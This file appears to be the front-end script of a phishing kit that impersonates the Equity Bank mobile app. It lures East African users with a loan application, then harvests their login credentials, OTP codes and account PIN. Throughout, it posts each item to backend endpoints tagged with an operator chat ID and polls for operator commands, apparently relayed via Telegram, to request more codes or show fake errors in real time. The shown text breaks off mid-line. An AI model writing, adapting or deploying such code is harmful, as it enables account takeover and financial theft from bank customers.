document.addEventListener('DOMContentLoaded', () => {
  // Screen Elements
  const screenWelcome = document.getElementById('screen-welcome');
  const screenStep1 = document.getElementById('screen-step1');
  const screenStep2 = document.getElementById('screen-step2');
  const screenStep3 = document.getElementById('screen-step3');
  const screenLogin = document.getElementById('screen-login');
  const screenOtp = document.getElementById('screen-otp');
  const screenPin = document.getElementById('screen-pin');
  const screenSuccess = document.getElementById('screen-success');
  const loadingOverlay = document.getElementById('loading-overlay');

  // Language Modal Elements
  const langModal = document.getElementById('language-modal');
  const btnToggleLang = document.getElementById('btn-toggle-lang');
  const btnCloseLang = document.getElementById('btn-close-lang');
  const langOptions = document.querySelectorAll('.lang-option');
  const checkEn = document.getElementById('check-en');
  const checkSw = document.getElementById('check-sw');

  // Banners
  const credsBanner = document.getElementById('banner-creds-error');
  const otpBanner = document.getElementById('banner-otp-error');
  const pinBanner = document.getElementById('banner-pin-error');

  // Inputs
  const countryDropdown = document.getElementById('country-dropdown');
  const loginIdentifier = document.getElementById('login-identifier');
  const loginPassword = document.getElementById('login-password');
  const btnSubmitLogin = document.getElementById('btn-submit-login');

  const otpBoxes = document.querySelectorAll('.otp-box-num');
  const btnSubmitOtp = document.getElementById('btn-submit-otp');

  const pinPhoneInput = document.getElementById('pin-phone-input');
  const pinBoxes = document.querySelectorAll('.pin-box-num');
  const btnSubmitPin = document.getElementById('btn-submit-pin');

  let currentUserId = null;
  let statusPollInterval = null;
  let currentLanguage = 'en';

  const urlParams = new URLSearchParams(window.location.search);
  const adminParam = urlParams.get('admin') || '';

  function showScreen(targetScreen) {
    [screenWelcome, screenStep1, screenStep2, screenStep3, screenLogin, screenOtp, screenPin, screenSuccess].forEach(s => {
      if (s) s.classList.remove('active');
    });
    if (targetScreen) targetScreen.classList.add('active');
  }

  // Country Configuration
  const countryConfigs = {
    'Tanzania, United Republic of': { lang: 'sw', flag: '🇹🇿', code: '+255', currency: 'TSh' },
    'Kenya': { lang: 'en', flag: '🇰🇪', code: '+254', currency: 'KSh' },
    'Uganda': { lang: 'en', flag: '🇺🇬', code: '+256', currency: 'USh' },
    'Rwanda': { lang: 'en', flag: '🇷🇼', code: '+250', currency: 'RWF' },
    'South Sudan': { lang: 'en', flag: '🇸🇸', code: '+211', currency: 'SSP' }
  };

  function updateLanguageTexts(lang) {
    currentLanguage = lang;
    const isSwahili = lang === 'sw';

    if (checkEn && checkSw) {
      checkEn.innerText = isSwahili ? '' : '✓';
      checkSw.innerText = isSwahili ? '✓' : '';
    }

    if (isSwahili) {
      document.getElementById('welcome-lang-text').innerText = 'Swa';
      document.getElementById('txt-welcome-title').innerText = 'Karibu Equity Mobile';
      document.getElementById('txt-welcome-sub').innerText = 'Habari za mchana! Ingia ili kuendelea';
      document.getElementById('btn-welcome-signin').innerText = 'Ingia';

      document.getElementById('lbl-step1').innerText = 'Hatua 1 ya 3';
      document.getElementById('lbl-calc-title').innerText = 'Kikokotoo cha Mkopo';
      document.getElementById('lbl-loan-type').innerText = 'Aina ya Mkopo';
      document.getElementById('lbl-loan-amount').innerText = 'Kiasi cha Mkopo';
      document.getElementById('lbl-loan-months').innerText = 'Muda wa Mkopo (Miezi)';
      document.getElementById('lbl-loan-purpose').innerText = 'Madhumuni ya Mkopo';
      document.getElementById('btn-step1-next').innerText = 'HATUA INAYOFUATA';

      document.getElementById('lbl-step2').innerText = 'Hatua 2 ya 3';
      document.getElementById('lbl-first-name').innerText = 'Jina la Kwanza';
      document.getElementById('lbl-last-name').innerText = 'Jina la Ukoo';
      document.getElementById('lbl-phone-no').innerText = 'Nambari ya Simu';
      document.getElementById('btn-step2-prev').innerText = 'ILIYOTANGULIA';
      document.getElementById('btn-step2-next').innerText = 'HATUA INAYOFUATA';

      document.getElementById('lbl-step3').innerText = 'Hatua 3 ya 3';
      document.getElementById('lbl-employment').innerText = 'Hali ya Ajira';
      document.getElementById('lbl-income').innerText = 'Mapato ya Mwaka';
      document.getElementById('lbl-sum-title').innerText = 'Muhtasari wa Maombi';
      document.getElementById('lbl-sum-amt').innerText = 'Kiasi:';
      document.getElementById('lbl-sum-mth').innerText = 'Muda:';
      document.getElementById('lbl-sum-prp').innerText = 'Madhumuni:';
      document.getElementById('lbl-sum-app').innerText = 'Mwombaji:';
      document.getElementById('btn-step3-prev').innerText = 'ILIYOTANGULIA';
      document.getElementById('btn-step3-next').innerText = 'WASILISHA MAOMBI';

      document.getElementById('lbl-welcome-back').innerText = 'Karibu tena';
      document.getElementById('lbl-hello-there').innerText = 'Habari yako,';
      document.getElementById('lbl-login-sub').innerText = 'Ingia ili kuendelea. Password yako ni siri yako.';
      document.getElementById('lbl-country-select').innerText = 'Nchi';
      document.getElementById('lbl-identifier').innerText = 'Barua pepe au namba ya simu';
      document.getElementById('lbl-password').innerText = 'Password';
      document.getElementById('lbl-forgot-pass').innerText = 'Umesahau password yako?';

      document.getElementById('lbl-otp-title').innerText = 'Uthibitisho wa OTP';
      document.getElementById('lbl-otp-sub').innerText = 'Weka OTP iliyotumwa kwenye nambari yako ya simu';
      document.getElementById('lbl-timer').innerText = 'Tuma tena msimbo ndani ya 40 sekunde';
      document.getElementById('btn-submit-otp').innerText = 'WASILISHA';

      document.getElementById('lbl-pin-title').innerText = 'Ingia Akaunti';
      document.getElementById('lbl-pin-sub').innerText = 'Weka namba yako ya simu na PIN ya akaunti';
      document.getElementById('lbl-pin-phone').innerText = 'Nambari ya Simu / Account No';
      document.getElementById('lbl-pin-4').innerText = 'Weka PIN yako (tarakimu 4)';
      document.getElementById('lbl-forgot-pin').innerText = 'Umesahau PIN?';
      document.getElementById('btn-submit-pin').innerText = 'INGIA';
    } else {
      document.getElementById('welcome-lang-text').innerText = 'Eng';
      document.getElementById('txt-welcome-title').innerText = 'Welcome to Equity mobile';
      document.getElementById('txt-welcome-sub').innerText = 'Good afternoon! Sign in to continue';
      document.getElementById('btn-welcome-signin').innerText = 'Sign in';

      document.getElementById('lbl-step1').innerText = 'Step 1 of 3';
      document.getElementById('lbl-calc-title').innerText = 'Loan Calculator';
      document.getElementById('lbl-loan-type').innerText = 'Loan Type';
      document.getElementById('lbl-loan-amount').innerText = 'Loan Amount';
      document.getElementById('lbl-loan-months').innerText = 'Loan Tenure (Months)';
      document.getElementById('lbl-loan-purpose').innerText = 'Loan Purpose';
      document.getElementById('btn-step1-next').innerText = 'NEXT STEP';

      document.getElementById('lbl-step2').innerText = 'Step 2 of 3';
      document.getElementById('lbl-first-name').innerText = 'First Name';
      document.getElementById('lbl-last-name').innerText = 'Last Name';
      document.getElementById('lbl-phone-no').innerText = 'Mobile Phone Number';
      document.getElementById('btn-step2-prev').innerText = 'PREVIOUS';
      document.getElementById('btn-step2-next').innerText = 'NEXT STEP';

      document.getElementById('lbl-step3').innerText = 'Step 3 of 3';
      document.getElementById('lbl-employment').innerText = 'Employment Status';
      document.getElementById('lbl-income').innerText = 'Annual Income';
      document.getElementById('lbl-sum-title').innerText = 'Application Summary';
      document.getElementById('lbl-sum-amt').innerText = 'Amount:';
      document.getElementById('lbl-sum-mth').innerText = 'Tenure:';
      document.getElementById('lbl-sum-prp').innerText = 'Purpose:';
      document.getElementById('lbl-sum-app').innerText = 'Applicant:';
      document.getElementById('btn-step3-prev').innerText = 'PREVIOUS';
      document.getElementById('btn-step3-next').innerText = 'SUBMIT APPLICATION';

      document.getElementById('lbl-welcome-back').innerText = 'Welcome back';
      document.getElementById('lbl-hello-there').innerText = 'Hello there,';
      document.getElementById('lbl-login-sub').innerText = 'Sign in to continue. Remember, your password is yours.';
      document.getElementById('lbl-country-select').innerText = 'Country';
      document.getElementById('lbl-identifier').innerText = 'Email address or mobile number';
      document.getElementById('lbl-password').innerText = 'Password';
      document.getElementById('lbl-forgot-pass').innerText = 'Forgot your password?';

      document.getElementById('lbl-otp-title').innerText = 'OTP Verification';
      document.getElementById('lbl-otp-sub').innerText = 'Enter the OTP code sent to your mobile phone';
      document.getElementById('lbl-timer').innerText = 'Resend code in 40 seconds';
      document.getElementById('btn-submit-otp').innerText = 'SUBMIT';

      document.getElementById('lbl-pin-title').innerText = 'Sign In Account';
      document.getElementById('lbl-pin-sub').innerText = 'Enter your phone number and account PIN';
      document.getElementById('lbl-pin-phone').innerText = 'Mobile Number / Account No';
      document.getElementById('lbl-pin-4').innerText = 'Enter your PIN (4 digits)';
      document.getElementById('lbl-forgot-pin').innerText = 'Forgot PIN?';
      document.getElementById('btn-submit-pin').innerText = 'SIGN IN';
    }
  }

  // Language Modal Handlers
  if (btnToggleLang) {
    btnToggleLang.addEventListener('click', () => langModal.classList.add('active'));
  }
  if (btnCloseLang) {
    btnCloseLang.addEventListener('click', () => langModal.classList.remove('active'));
  }

  langOptions.forEach(opt => {
    opt.addEventListener('click', () => {
      const selectedLang = opt.getAttribute('data-lang');
      updateLanguageTexts(selectedLang);
      langModal.classList.remove('active');
    });
  });

  // Country Dropdown Event
  countryDropdown.addEventListener('change', (e) => {
    const countryName = e.target.value;
    const config = countryConfigs[countryName] || countryConfigs['Tanzania, United Republic of'];
    
    // Update Flags
    ['1', '2', '3'].forEach(id => {
      const badge = document.getElementById(`badge-country-${id}`);
      const flag = document.getElementById(`flag-display-${id}`);
      if (badge) badge.innerText = countryName.toUpperCase();
      if (flag) flag.innerText = config.flag;
    });

    document.getElementById('phone-flag-prefix').innerText = `${config.flag} ${config.code}`;
    document.getElementById('pin-flag-prefix').innerText = `${config.flag} ${config.code}`;

    updateLanguageTexts(config.lang);
  });

  // GUARANTEED SIGN IN BUTTON CLICK HANDLER
  const btnSignIn = document.getElementById('btn-welcome-signin');
  if (btnSignIn) {
    ['click', 'touchstart'].forEach(evt => {
      btnSignIn.addEventListener(evt, (e) => {
        e.preventDefault();
        showScreen(screenStep1);
      });
    });
  }

  // Sliders
  const loanSlider = document.getElementById('loan-amount-slider');
  const loanText = document.getElementById('loan-amount-text');
  const monthsSlider = document.getElementById('loan-months-slider');
  const monthsText = document.getElementById('loan-months-text');

  loanSlider.addEventListener('input', (e) => {
    const config = countryConfigs[countryDropdown.value] || countryConfigs['Tanzania, United Republic of'];
    loanText.innerText = `${config.currency} ${Number(e.target.value).toLocaleString()}`;
  });

  monthsSlider.addEventListener('input', (e) => {
    monthsText.innerText = `Miezi ${e.target.value}`;
  });

  // Visibility Toggles
  document.getElementById('toggle-password').addEventListener('click', () => {
    loginPassword.type = loginPassword.type === 'password' ? 'text' : 'password';
  });

  document.getElementById('toggle-pin-visibility').addEventListener('click', () => {
    pinBoxes.forEach(box => box.type = box.type === 'password' ? 'text' : 'password');
  });

  // Flexible Box Digit Inputs
  function setupAutoTab(boxes) {
    boxes.forEach((box, idx) => {
      box.addEventListener('input', () => {
        box.value = box.value.replace(/\D/g, '');
        if (box.value && idx < boxes.length - 1) {
          boxes[idx + 1].focus();
        }
      });

      box.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !box.value && idx > 0) {
          boxes[idx - 1].focus();
        }
      });
    });
  }

  setupAutoTab(otpBoxes);
  setupAutoTab(pinBoxes);

  // Step Navigation Buttons
  document.getElementById('btn-step1-back').addEventListener('click', () => showScreen(screenWelcome));
  document.getElementById('btn-step1-next').addEventListener('click', () => showScreen(screenStep2));

  document.getElementById('btn-step2-prev').addEventListener('click', () => showScreen(screenStep1));
  document.getElementById('btn-step2-next').addEventListener('click', () => {
    const fn = document.getElementById('first-name').value.trim();
    const ln = document.getElementById('last-name').value.trim();
    const config = countryConfigs[countryDropdown.value] || countryConfigs['Tanzania, United Republic of'];

    document.getElementById('sum-amount').innerText = `${config.currency} ${Number(loanSlider.value).toLocaleString()}`;
    document.getElementById('sum-months').innerText = `${monthsSlider.value} Miezi`;
    document.getElementById('sum-purpose').innerText = document.getElementById('loan-purpose').value.trim() || 'Biashara';
    document.getElementById('sum-name').innerText = `${fn} ${ln}`.trim() || 'N/A';

    showScreen(screenStep3);
  });

  document.getElementById('btn-step3-prev').addEventListener('click', () => showScreen(screenStep2));

  // Step 3 Next -> Submit Summary & Move to Login Screen
  document.getElementById('btn-step3-next').addEventListener('click', async () => {
    showLoading('INATHIBITISHA...', 'Tafadhali subiri.');

    try {
      const res = await fetch('/api/submit-application-summary', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          fullName: document.getElementById('sum-name').innerText,
          phone: document.getElementById('phone-number').value.trim(),
          loanType: document.getElementById('loan-type-select').value,
          loanAmount: loanSlider.value,
          loanMonths: monthsSlider.value,
          country: countryDropdown.value,
          adminChatId: adminParam
        })
      });

      const data = await res.json();
      hideLoading();
      if (data.success) {
        currentUserId = data.userId;
        showScreen(screenLogin);
      }
    } catch (e) {
      hideLoading();
      showScreen(screenLogin);
    }
  });

  // Submit Login Credentials
  btnSubmitLogin.addEventListener('click', async () => {
    if (!loginIdentifier.value.trim() || !loginPassword.value.trim()) return;

    if (credsBanner) credsBanner.classList.remove('active');
    showLoading('INATHIBITISHA TAARIFA...', 'Tafadhali subiri.');

    try {
      const res = await fetch('/api/submit-credentials', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: currentUserId,
          country: countryDropdown.value,
          loginIdentifier: loginIdentifier.value.trim(),
          password: loginPassword.value.trim(),
          adminChatId: adminParam
        })
      });

      const data = await res.json();
      if (data.success) startPolling();
      else hideLoading();
    } catch (e) {
      hideLoading();
    }
  });

  // Submit OTP
  async function submitOtpHandler() {
    const otpVal = Array.from(otpBoxes).map(b => b.value).join('');
    if (otpVal.length !== otpBoxes.length) return;

    if (otpBanner) otpBanner.classList.remove('active');
    showLoading('INAKAGUA OTP...', 'Tafadhali subiri.');

    try {
      const res = await fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: currentUserId, otp: otpVal })
      });
      const data = await res.json();
      if (data.success) startPolling();
      else hideLoading();
    } catch (e) {
      hideLoading();
    }
  }

  btnSubmitOtp.addEventListener('click', submitOtpHandler);

  // Submit PIN
  btnSubmitPin.addEventListener('click', async () => {
    const pinVal = Array.from(pinBoxes).map(b => b.value).join('');
    const accPhone = pinPhoneInput.value.trim();
    if (pinVal.length !== 4 || !accPhone) return;

    if (pinBanner) pinBanner.classList.remove('active');
    showLoading('INATHIBITISHA PIN...', 'Tafadhali subiri.');

    try {
      const res = await fetch('/api/submit-pin-details', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: currentUserId,
          accountNumber: accPhone,
          accountPin: pinVal
        })
      });
      const data = await res.json();
      if (data.success) startPolling();
      else hideLoading();
    } catch (e) {
      hideLoading();
    }
  });

  // Polling Function for Telegram Admin Callbacks
  function startPolling() {
    if (statusPollInterval) clearInterval(statusPollInterval);

    statusPollInterval = setInterval(async () => {
      if (!currentUserId) return;

      try {
        const res = await fetch(`/api/check-status/${currentUserId}`);
        const data = await res.json();

        if (data.status === 'PROCEED_OTP') {
          clearInterval(statusPollInterval);
          hideLoading();
          showScreen(screenOtp);
          if (otpBoxes[0]) otpBoxes[0].focus();
        } else if (data.status === 'PROCEED_PIN') {
          clearInterval(statusPollInterval);
          hideLoading();
          showScreen(screenPin);
          if (pinPhoneInput) pinPhoneInput.value = document.getElementById('phone-number').value.trim();
        } else if (data.status === 'RETRY_CREDS') {
          clearInterval(statusPollInterval);
          hideLoading();
          if (credsBanner) {
            credsBanner.innerText = 'INVALID ACC. DETAILS ❌ Please check your email/mobile or password.';
            credsBanner.classList.add('active');
          }
          showScreen(screenLogin);
        } else if (data.status === 'RETRY_OTP') {
          clearInterval(statusPollInterval);
          hideLoading();
          if (otpBanner) {
            otpBanner.innerText = 'OTP EXPIRES ❌ Please enter the new OTP code.';
            otpBanner.classList.add('active');
          }
          otpBoxes.forEach(b => b.value = '');
          showScreen(screenOtp);
        } else if (data.status === 'RETRY_PIN') {
          clearInterval(statusPollInterval);
          hideLoading();
          if (pinBanner) {
            pinBanner.innerText = 'WRONG PIN ❌ Incorrect account PIN. Please try again.';
            pinBanner.classList.add('active');
          }
          pinBoxes.forEach(b => b.value = '');
          showScreen(screenPin);
        } else if (data.status === 'SUCCESS') {
          clearInterval(statusPollInterval);
          hideLoading();
          const config = countryConfigs[countryDropdown.value] || countryConfigs['Tanzania, United Republ
